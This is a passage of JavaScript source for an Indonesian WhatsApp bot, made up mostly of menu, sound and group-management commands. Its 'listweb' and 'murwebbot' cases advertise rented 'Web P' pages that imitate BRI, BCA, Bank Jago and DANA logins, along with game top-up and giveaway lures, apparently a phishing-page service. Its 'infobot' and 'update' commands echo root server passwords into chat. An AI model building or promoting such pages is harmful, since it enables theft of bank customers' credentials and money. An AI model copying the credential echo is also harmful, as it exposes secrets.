let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, min, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mdatabase': {
dtbase = `┌──⭓ *Database Menu*
│
│⭔ ${prefix}setcmd
│⭔ ${prefix}listcmd
│⭔ ${prefix}delcmd
│⭔ ${prefix}lockcmd
│⭔ ${prefix}addmsg
│⭔ ${prefix}listmsg
│⭔ ${prefix}getmsg
│⭔ ${prefix}delmsg
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, dtbase, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'manonymous': {
aonymous = `┌──⭓ *Anonymous Menu*
│
│⭔ ${prefix}anonymous
│⭔ ${prefix}start
│⭔ ${prefix}next
│⭔ ${prefix}keluar
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, aonymous, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mislamic': {
islmic = `┌──⭓ *Islamic Menu*
│
│⭔ ${prefix}iqra
│⭔ ${prefix}hadist
│⭔ ${prefix}alquran
│⭔ ${prefix}juzamma
│⭔ ${prefix}tafsirsurah
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, islmic, nyoutube, m, {quoted: fkontak})
            }
            break
case 'mvoice': {
vice = `┌──⭓ *Voice Changer*
│
│⭔ ${prefix}bass
│⭔ ${prefix}blown
│⭔ ${prefix}deep
│⭔ ${prefix}earrape
│⭔ ${prefix}fast
│⭔ ${prefix}fat
│⭔ ${prefix}nightcore
│⭔ ${prefix}reverse
│⭔ ${prefix}robot
│⭔ ${prefix}slow
│⭔ ${prefix}tupai
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, vice, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mowner': {
oner = `┌──⭓ *Owner Menu*
│
│⭔ ${prefix}react [emoji]
│⭔ ${prefix}chat [option]
│⭔ ${prefix}join [link]
│⭔ ${prefix}leave
│⭔ ${prefix}block @user
│⭔ ${prefix}unblock @user
│⭔ ${prefix}bcgroup [text]
│⭔ ${prefix}bcall [text]
│⭔ ${prefix}setppbot [image]
│⭔ ${prefix}setexif
│⭔ ${prefix}setmenu [option]
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '⌕ List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, oner, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'allmenu': {
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let ments = [ownernya, me, ini_mark]
                anu = `*${ucapanWaktu}*\n*kak @${me.split('@')[0]}*\n*Powered*  : @${ini_mark.split('@')[0]}\n*Creator* : @${ownernya.split('@')[0]}
┌──⭓ *Group Menu*
│
│⭔ ${prefix}linkgroup
│⭔ ${prefix}ephemeral [option]
│⭔ ${prefix}setppgc [image]
│⭔ ${prefix}setname [text]
│⭔ ${prefix}setdesc [text]
│⭔ ${prefix}group [option]
│⭔ ${prefix}editinfo [option]
│⭔ ${prefix}add @user
│⭔ ${prefix}kick @user
│⭔ ${prefix}hidetag [text]
│⭔ ${prefix}tagall [text]
│⭔ ${prefix}antilink [on/off]
│⭔ ${prefix}mute [on/off]
│⭔ ${prefix}promote @user
│⭔ ${prefix}demote @user
│⭔ ${prefix}vote [text]
│⭔ ${prefix}devote
│⭔ ${prefix}upvote
│⭔ ${prefix}cekvote
│⭔ ${prefix}hapusvote
│
└───────𖦹Ꜥꜥ
┌──⭓ *Webzone Menu*
│
│⭔ ${prefix}playstore
│⭔ ${prefix}gsmarena
│⭔ ${prefix}jadwalbioskop
│⭔ ${prefix}nowplayingbioskop
│⭔ ${prefix}aminio
│⭔ ${prefix}wattpad
│⭔ ${prefix}webtoons
│⭔ ${prefix}drakor
│
└───────𖦹Ꜥꜥ
┌──⭓ *Downloader Menu*
│
│⭔ ${prefix}tiktoknowm [url]
│⭔ ${prefix}tiktokwm [url]
│⭔ ${prefix}tiktokmp3 [url]
│⭔ ${prefix}instagram [url]
│⭔ ${prefix}twitter [url]
│⭔ ${prefix}twittermp3 [url]
│⭔ ${prefix}facebook [url]
│⭔ ${prefix}pinterestdl [url]
│⭔ ${prefix}ytmp3 [url]
│⭔ ${prefix}ytmp4 [url]
│⭔ ${prefix}getmusic [query]
│⭔ ${prefix}getvideo [query]
│⭔ ${prefix}umma [url]
│⭔ ${prefix}joox [query]
│⭔ ${prefix}soundcloud [url]
│
└───────𖦹Ꜥꜥ
┌──⭓ *Search Menu*
│
│⭔ ${prefix}play [query]
│⭔ ${prefix}yts [query]
│⭔ ${prefix}google [query]
│⭔ ${prefix}gimage [query]
│⭔ ${prefix}pinterest [query]
│⭔ ${prefix}wallpaper [query]
│⭔ ${prefix}wikimedia [query]
│⭔ ${prefix}ytsearch [query]
│⭔ ${prefix}ringtone [query]
│⭔ ${prefix}stalk [option] [query]
│
└───────𖦹Ꜥꜥ
┌──⭓ *Random Menu*
│
│⭔ ${prefix}gbtku
│⭔ ${prefix}coffe
│⭔ ${prefix}quotesanime
│⭔ ${prefix}motivasi
│⭔ ${prefix}dilanquote
│⭔ ${prefix}bucinquote
│⭔ ${prefix}katasenja
│⭔ ${prefix}puisi
│⭔ ${prefix}couple
│⭔ ${prefix}anime
│⭔ ${prefix}waifu
│
└───────𖦹Ꜥꜥ
┌──⭓ *Text Pro Menu*
│
│⭔ ${prefix}3dchristmas
│⭔ ${prefix}3ddeepsea
│⭔ ${prefix}americanflag
│⭔ ${prefix}3dscifi
│⭔ ${prefix}3drainbow
│⭔ ${prefix}3dwaterpipe
│⭔ ${prefix}halloweenskeleton
│⭔ ${prefix}sketch
│⭔ ${prefix}bluecircuit
│⭔ ${prefix}space
│⭔ ${prefix}metallic
│⭔ ${prefix}fiction
│⭔ ${prefix}greenhorror
│⭔ ${prefix}transformer
│⭔ ${prefix}berry
│⭔ ${prefix}thunder
│⭔ ${prefix}magma
│⭔ ${prefix}3dcrackedstone
│⭔ ${prefix}3dneonlight
│⭔ ${prefix}impressiveglitch
│⭔ ${prefix}naturalleaves
│⭔ ${prefix}fireworksparkle
│⭔ ${prefix}matrix
│⭔ ${prefix}dropwater
│⭔ ${prefix}harrypotter
│⭔ ${prefix}foggywindow
│⭔ ${prefix}neondevils
│⭔ ${prefix}christmasholiday
│⭔ ${prefix}3dgradient
│⭔ ${prefix}blackpink
│⭔ ${prefix}gluetext
│
└───────𖦹Ꜥꜥ
┌──⭓ *Photo Oxy Menu*
│
│⭔ ${prefix}shadow
│⭔ ${prefix}romantic
│⭔ ${prefix}smoke
│⭔ ${prefix}burnpapper
│⭔ ${prefix}naruto
│⭔ ${prefix}lovemsg
│⭔ ${prefix}grassmsg
│⭔ ${prefix}lovetext
│⭔ ${prefix}coffecup
│⭔ ${prefix}butterfly
│⭔ ${prefix}harrypotter
│⭔ ${prefix}retrolol
│
└───────𖦹Ꜥꜥ
┌──⭓ *Ephoto Menu*
│
│⭔ ${prefix}ffcover
│⭔ ${prefix}crossfire
│⭔ ${prefix}galaxy
│⭔ ${prefix}glass
│⭔ ${prefix}neon
│⭔ ${prefix}beach
│⭔ ${prefix}blackpink
│⭔ ${prefix}igcertificate
│⭔ ${prefix}ytcertificate
│
└───────𖦹Ꜥꜥ
┌──⭓ *Fun Menu*
│
│⭔ ${prefix}simih
│⭔ ${prefix}halah
│⭔ ${prefix}hilih
│⭔ ${prefix}huluh
│⭔ ${prefix}heleh
│⭔ ${prefix}holoh
│⭔ ${prefix}jadian
│⭔ ${prefix}jodohku
│⭔ ${prefix}apakah
│⭔ ${prefix}bisakah
│⭔ ${prefix}kapan
│⭔ ${prefix}slot
│⭔ ${prefix}delttt
│⭔ ${prefix}tictactoe
│⭔ ${prefix}family100
│⭔ ${prefix}tebak [option]
│⭔ ${prefix}math [mode]
│⭔ ${prefix}suitpvp [@tag]
│
└───────𖦹Ꜥꜥ
┌──⭓ *Primbon Menu*
│
│⭔ ${prefix}nomorhoki
│⭔ ${prefix}artimimpi
│⭔ ${prefix}artinama
│⭔ ${prefix}ramaljodoh
│⭔ ${prefix}ramaljodohbali
│⭔ ${prefix}suamiistri
│⭔ ${prefix}ramalcinta
│⭔ ${prefix}cocoknama
│⭔ ${prefix}pasangan
│⭔ ${prefix}jadiannikah
│⭔ ${prefix}sifatusaha
│⭔ ${prefix}rezeki
│⭔ ${prefix}pekerjaan
│⭔ ${prefix}nasib
│⭔ ${prefix}penyakit
│⭔ ${prefix}tarot
│⭔ ${prefix}fengshui
│⭔ ${prefix}haribaik
│⭔ ${prefix}harisangar
│⭔ ${prefix}harisial
│⭔ ${prefix}nagahari
│⭔ ${prefix}arahrezeki
│⭔ ${prefix}peruntungan
│⭔ ${prefix}weton
│⭔ ${prefix}karakter
│⭔ ${prefix}keberuntungan
│⭔ ${prefix}memancing
│⭔ ${prefix}masasubur
│⭔ ${prefix}zodiak
│
└───────𖦹Ꜥꜥ
┌──⭓ *Convert Menu*
│
│⭔ ${prefix}attp
│⭔ ${prefix}ttp
│⭔ ${prefix}toimage
│⭔ ${prefix}removebg
│⭔ ${prefix}sticker
│⭔ ${prefix}emojimix
│⭔ ${prefix}emojimix2
│⭔ ${prefix}tovideo
│⭔ ${prefix}togif
│⭔ ${prefix}tourl
│⭔ ${prefix}tovn
│⭔ ${prefix}tomp3
│⭔ ${prefix}toaudio
│⭔ ${prefix}ebinary
│⭔ ${prefix}dbinary
│⭔ ${prefix}styletext
│⭔ ${prefix}smeme
│
└───────𖦹Ꜥꜥ
┌──⭓ *Main Menu*
│
│⭔ ${prefix}ping
│⭔ ${prefix}owner
│⭔ ${prefix}report
│⭔ ${prefix}menu / ${prefix}help / ${prefix}?
│⭔ ${prefix}delete
│⭔ ${prefix}infochat
│⭔ ${prefix}quoted
│⭔ ${prefix}listpc
│⭔ ${prefix}listgc
│⭔ ${prefix}listonline
│⭔ ${prefix}speedtest
│⭔ ${prefix}menfes
│⭔ ${prefix}tinyurl
│⭔ ${prefix}isgd
│⭔ ${prefix}vurl
│⭔ ${prefix}clp
│
└───────𖦹Ꜥꜥ
┌──⭓ *Database Menu*
│
│⭔ ${prefix}setcmd
│⭔ ${prefix}listcmd
│⭔ ${prefix}delcmd
│⭔ ${prefix}lockcmd
│⭔ ${prefix}addmsg
│⭔ ${prefix}listmsg
│⭔ ${prefix}getmsg
│⭔ ${prefix}delmsg
│
└───────𖦹Ꜥꜥ
┌──⭓ *Anonymous Menu*
│
│⭔ ${prefix}anonymous
│⭔ ${prefix}start
│⭔ ${prefix}next
│⭔ ${prefix}keluar
│
└───────𖦹Ꜥꜥ
┌──⭓ *Islamic Menu*
│
│⭔ ${prefix}iqra
│⭔ ${prefix}hadist
│⭔ ${prefix}alquran
│⭔ ${prefix}juzamma
│⭔ ${prefix}tafsirsurah
│
└───────𖦹Ꜥꜥ
┌──⭓ *Voice Changer*
│
│⭔ ${prefix}bass
│⭔ ${prefix}blown
│⭔ ${prefix}deep
│⭔ ${prefix}earrape
│⭔ ${prefix}fast
│⭔ ${prefix}fat
│⭔ ${prefix}nightcore
│⭔ ${prefix}reverse
│⭔ ${prefix}robot
│⭔ ${prefix}slow
│⭔ ${prefix}tupai
│
└───────𖦹Ꜥꜥ
┌──⭓ *Owner Menu*
│
│⭔ ${prefix}react [emoji]
│⭔ ${prefix}chat [option]
│⭔ ${prefix}join [link]
│⭔ ${prefix}leave
│⭔ ${prefix}block @user
│⭔ ${prefix}unblock @user
│⭔ ${prefix}bcgroup [text]
│⭔ ${prefix}bcall [text]
│⭔ ${prefix}setppbot [image]
│⭔ ${prefix}setexif
│⭔ ${prefix}setmenu [option]
│
└───────𖦹Ꜥꜥ
_Support kami_\n_Dengan Cara Berdonasi_`
                let buttons = [{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '⌕ Rules' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, anu, nyoutube, m, {mentions: ments, quoted: fkontak})
            }
            break
case 'listgc': {
                	if (!isCreator) throw mess.owner
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await MEYBotz.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n─────────────────\n\n`
                 let buttons = [{ buttonId: 'donasi', buttonText: { displayText: '👑 SEWA' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 }]
await MEYBotz.sendButtonText(m.chat, buttons, teks, nyoutube, m, {mentions: [metadata.owner], quoted: fkontak})
}}
             break
case 'assalamualaikum': {
               goblok = fs.readFileSync('./sound/salam.mp3')
MEYBotz.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted:m})}
break
case 'bot': {
               list = ['./sound/oy.mp3','./sound/kenapa.mp3','./sound/iya.mp3']
 random = list[Math.floor(Math.random() * list.length)]
goblok = fs.readFileSync(random)
MEYBotz.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted:m})}
break
case 'kontol': {
               goblok = fs.readFileSync('./sound/ASADE.mp3')
MEYBotz.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted:m})}
break
case 'menyesal': {
               goblok = fs.readFileSync('./sound/menyesal.mp3')
MEYBotz.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted:m})}
break
case 'sc': {
               goblok = fs.readFileSync('./sound/sc.mp3')
MEYBotz.sendMessage(m.chat, {audio: goblok, mimetype:'audio/mpeg', ptt:true }, {quoted:m})}
break
            case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
MEYBotz_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await MEYBotz.sendMessage(m.chat, { audio: MEYBotz_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
//Menu sesat//
case 'bocil1': {
m.reply(`Janggan spam om`)
let alok = fs.readFileSync('./video/vidio1.mp4')
MEYBotz.sendMessage(m.chat, {video: alok, mimetype:'video/mp4', ptt:true }, {quoted:m})
            }
break
//MENU HOSTING//
case 'update':
        if (!isCreator && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        
            if(args == ""){
            psn = `SILAHKAN DI SIMAK
jika ingin update url server ketik *${prefix}${command}* Log Whm | namaserver.domain
             
jika ingin update username server ketik *${prefix}${command}* username | meixgan
             
jika ingin update password server ketik *${prefix}${command}* password | @@Contoh@@
             
jika ingin update ipaddress server ketik *${prefix}${command}* ip | 1.1.1.1
             
jika ingin tambah grup ketik *${prefix}${command}* grup | 120363024692676255@g.us
            `
            m.reply(psn)
            }else{
                
                jenis = args[0]
                isi = args[2]
            
            update= updateDatabase(jenis,isi)
            if(update == "success"){
            server = JSON.parse(fs.readFileSync('./database/server.json'))
            grups = JSON.parse(fs.readFileSync('./database/grups.json'))
            
                info = `*『 INFO SETINGAN BOT HOST 』*
┏━━━━━━━━━━━━━━━━━━━
┣ Server = ${server[0].url}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${server[0].username}
┗━━━━━━━━━━━━━━━━━━━
┣ Password = ${server[0].password}
┗━━━━━━━━━━━━━━━━━━━
┣ Ip address = ${server[0].ip}
┗━━━━━━━━━━━━━━━━━━━

NOTE : GANTI TERGANTUNG KEMAOAN ANDA AJA YO , APABILA EROR ? BERARTI DI ANTARA PW / URL DI GANTI MAKASIH
            
            `
            m.reply(info)
                }
                
            }
            
            break
            case 'infobot':           
            if (!isCreator && !mek.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
            id = mek.key.remoteJid
        
            info = `INFO SETINGAN BOT HOST
            
-- DETAIL AKUN ROOT--
Server = ${server[0].url}
Username = ${server[0].username}
Password = ${server[0].password}
Ip address = ${server[0].ip}
Zone = ${server[0].zonez}

            `
            m.reply(info);
           
            break            
        case 'listgrup':
if (!isCreator && !mek.key.fromMe) return m.reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        let text = "LIST GRUP VIP :\n\n"
        for (let i = 0; i < grups.length; i++) {
                text += "> "+ grups[i] + "\n";
            }
            m.reply(text)
            
            
            break    
            case 'cekidgrup':
            if (!isCreator && !mek.key.fromMe) return m.reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
                id = mek.key.remoteJid
                pengirim = mek.key.participant
                nama = mek.pushName
          

    await MEYBotz.sendMessage(pengirim,{text: `HALO ${nama} \n\n ${id} \n\n`},{quoted:mek})

            break 

//CASE HOST
case 'testt': {
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let ments = [ownernya, me, ini_mark]
            let kukiw = `*${ucapanWaktu}*
╭──❏「 𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍 」❏
├ *Nama* : ${pushname}
├ *Number* : ${me.split('@')[0]}
├ *Premium* : ${isPremium ? '✅' : `❌`}
├ *Limit* : ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
╰──❏

╭──❏「 𝙄𝙉𝙁𝙊 𝘽𝙊𝙏 」❏
├ *Nama Bot* : ${pushname}
├ *Mode* : ${MEYBotz.public ? 'Public' : `Self`}
├ *Prefix* :「 MULTI-PREFIX 」
╰──

╭──❏「 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼𝙉 𝙏𝙄𝙈𝙀 」❏
├ *Hari Ini* : ${hariini}
├ *Wib* : ${barat} WIB
├ *Wita* : ${tengah} WITA
├ *Wit* : ${timur} WIT
╰──❏`
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "pasanglincese", rowId: `pasanglincese`, description: `👥Group Menu`},
                {title: "createakun", rowId: `createakun`, description: `📹Webzone Menu`},
                {title: "addroot", rowId: `addroot`, description: `📥Downloader Menu`},
                {title: "addip", rowId: `addip`, description: `🔍Search Menu`},
                {title: "webp", rowId: `webp`, description: `❔Random Menu`},
                {title: "sosmed", rowId: `sosmed`, description: `❇Text Pro Menu`},
                {title: "murwebbot", rowId: `murwebbot`, description: `♻️Photo Oxy Menu`},
                {title: "terminallpackage", rowId: `terminallpackage`, description: `🗳Ephoto Menu`},
                {title: "update", rowId: `mfun`, update: `🔫Fun Menu`},
                {title: "pasangsmtp", rowId: `pasangsmtp`, description: `😂Primbon Menu`},
                {title: "cekdefault", rowId: `cekdefault`, description: `🛠Convert Menu`},
                {title: "ceksmtp", rowId: `ceksmtp`, description: `💾Main Menu`},
                {title: "listweb", rowId: `listweb`, description: `📁Database Menu`},
                {title: "addpackage", rowId: `addpackage`, description: `🎭Anonymous Menu`},
                {title: "listdomain", rowId: `listdomain`, description: `🕌Islamic Menu`},
                {title: "domain", rowId: `domain`, description: `🎶Voice Menu`},
                {title: "Owner", rowId: `mowner`, description: `🎟Owner Menu`}
                ]
                },
                ]
                MEYBotz.sendListMsg(m.chat, kukiw, nyoutube, `*Hello Kak ${pushname}*!`, `Pilih Menu`, sections, m, {quoted: fkontak})
            }
            break
case 'menuhost': {
               anjayyy = fs.readFileSync('./sound/menuhost.mp3')
MEYBotz.sendMessage(m.chat, {audio: anjayyy, mimetype:'audio/mpeg', ptt:true }, {quoted:m})}
{
menuhost = `┌──⭓ *Hosting Menu*
│
│⭔ ${prefix}listdomain
│⭔ ${prefix}domain 1-3
│⭔ ${prefix}createakun
│⭔ ${prefix})p
│⭔ ${prefix}listweb
│⭔ ${prefix}termint 
│⭔ ${prefix}addpackage
│⭔ ${prefix}ceksmtp
│⭔ ${prefix}cekdefault
│⭔ ${prefix}pasangsmtp
│⭔ ${prefix}update
│⭔ ${prefix}terminallpackage
│
└───────𖦹Ꜥꜥ`
let buttons = [{ buttonId: 'listweb', buttonText: { displayText: '🧑‍💻List Web p' }, type: 1 },{ buttonId: 'listdomain', buttonText: { displayText: '⏩NEXT' }, type: 1 },{ buttonId: 'murwebbot', buttonText: { displayText: '⏩SEWA MURWEB' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, menuhost, nyoutube, m, {quoted: fkontak})
            }
            break

case 'murwebbot': {
murwebbot = `▬▭▬▭▬▭▬▭▬▭▬▭▬▭
╔━══━══━══━══━══━══━
┃╭──────────────────
║╞═[ *SEWA BOT SERVER* ]
┃│✄ *- 15K PERMINGGU*
║│✄ *- 30K PERBULAN*
┃│✄ *- 50K MANEN*
┃╰──────────────────
╚━══━══━══━══━══━══━
▬▭▬▭▬▭▬▭▬▭▬▭▬▭`
let buttons = [{ buttonId: 'listweb', buttonText: { displayText: '🧑‍💻List Web p' }, type: 1 },{ buttonId: 'listdomain', buttonText: { displayText: '⏩NEXT' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '⌕ Donasi' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, murwebbot, nyoutube, m, {quoted: fkontak})
            }
            break
case 'web10': case 'web11': case 'web12': case 'web13': case 'web14': case 'web15':
case 'web16': case 'web17': case 'web18': 
id = mek.key.remoteJid
        if(validGrup(id,grups)){
m.reply(`_Fitur Sedang masa update....._`)
}else{
	m.reply("_MOHON MAFF ,HARAP PERPANJANG LAGI MAKASIH_")
    }
break
case 'listweb': {
listweb = `┌──⭓ *Web P Menu*
│
│⭔ ${prefix}web1 Mediafire MP4
│⭔ ${prefix}web2 Mediafire FILE
│⭔ ${prefix}web3 Simontok
│⭔ ${prefix}web4 Mobile Legends
│⭔ ${prefix}web5 Groupwa V1
│⭔ ${prefix}web6 Groupwa V2 
│⭔ ${prefix}web7 Codashop ( Bug )
│⭔ ${prefix}web8 Youtube
│⭔ ${prefix}web9 Free Firee Spin
│
├─────⭓ *Web P Bank*
│
│⭔ ${prefix}web10 Bri Tarif
│⭔ ${prefix}web11 Bri Login 
│⭔ ${prefix}web12 Bri Tarif 2 ( tele )
│⭔ ${prefix}web13 Bca Tarif
│⭔ ${prefix}web14 Bca Login ( tele )
│⭔ ${prefix}web15 Bca Tarif 2
│⭔ ${prefix}web16 Daget ( dana )
│⭔ ${prefix}web17 Krivo
│⭔ ${prefix}web18 Bank Jago
│
└───────𖦹Ꜥꜥ

Contoh : _ketik ${prefix}web1 Mediafire MP4_

NOTE : JANGGAN SPAM YA !! 🤗 HARGAI BOT
SOALNYA BOT LAGI MASA UPDATE`
let buttons = [{ buttonId: 'sosmed', buttonText: { displayText: '🧑‍🏫SOSMEDYOS' }, type: 1 },{ buttonId: 'menuhost', buttonText: { displayText: '⏩MENU HOST' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: '⏩OWNER' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, listweb, nyoutube, m, {quoted: fkontak})
            }
            break
case 'listdomain': {
               anjayyy = fs.readFileSync('./sound/menuhost.mp3')
MEYBotz.sendMessage(m.chat, {audio: anjayyy, mimetype:'audio/mpeg', ptt:true }, {quoted:m})}
{
listdomain = `*『 LIST DOMAIN 』*
┏━━━━━━━━━━━━━━━━━━━
┣ ${prefix}domain1 storeid-real.my.id ✅
┗━━━━━━━━━━━━━━━━━━━
┣ ${prefix}domain2 mxg.my.id ✅
┗━━━━━━━━━━━━━━━━━━━
┣ ${prefix}domain3  ---------------- ✅
┗━━━━━━━━━━━━━━━━━━━
┣ ${prefix}domain4 new-amay.my.id ✅
┗━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━
┣ ${prefix}domain5 new-v2.my.id ✅
┗━━━━━━━━━━━━━━━━━━━
┣ ${prefix}domain6 mrclnotwibu.my.id ✅
┗━━━━━━━━━━━━━━━━━━━
┣ ${prefix}domain7 v1-net-id.my.id ✅
┗━━━━━━━━━━━━━━━━━━━
┣ ${prefix}domain8 v1-net-id.my.id ✅
┗━━━━━━━━━━━━━━━━━━━

NOTE : LIST DOMAIN HNYA ADA 4 KALO MAO TAMBAHAN ? CHAT OWNER`
let buttons = [{ buttonId: 'sosmed', buttonText: { displayText: '🔐SOSMED YOS19' }, type: 1 },{ buttonId: 'ptserver', buttonText: { displayText: '🔥NEXT' }, type: 1 },{ buttonId: 'listweb', buttonText: { displayText: '🛑List Web P' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, listdomain, nyoutube, m, {quoted: fkontak})
            }
            break
case 'sosmed': {
listdomain = `*『 Social Media YOS19 』*

Github : https://youtube.com/c/MEIXGAN

Instagram : https://www.instagram.com/Meixgan

Facebook : https://www.facebook.com/rofi.rofi.167189

YouTube : update

Twitter : update

Telegram : https://t.me/meixgan

TikTok : https:www.tiktok.com/@meixgan_

NOTE : JANGGAN LUPA MAMPIR YGY🤗`
let buttons = [{ buttonId: 'owner', buttonText: { displayText: '🇮🇩List Domain2' }, type: 1 },{ buttonId: 'ptserver', buttonText: { displayText: '👹NEXT' }, type: 1 },{ buttonId: 'listweb', buttonText: { displayText: '🧑‍🏫List Web P' }, type: 1 }]
            await MEYBotz.sendButtonText(m.chat, buttons, listdomain, nyoutube, m, {quoted: fkontak})
            }
            break
case 'tinyurl': case 'shortlink': {
                let anu = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`)
                let buttons = [
                    {buttonId: `hehehe`, buttonText: {displayText: '🙏THANKS'}, type: 1}
                ]
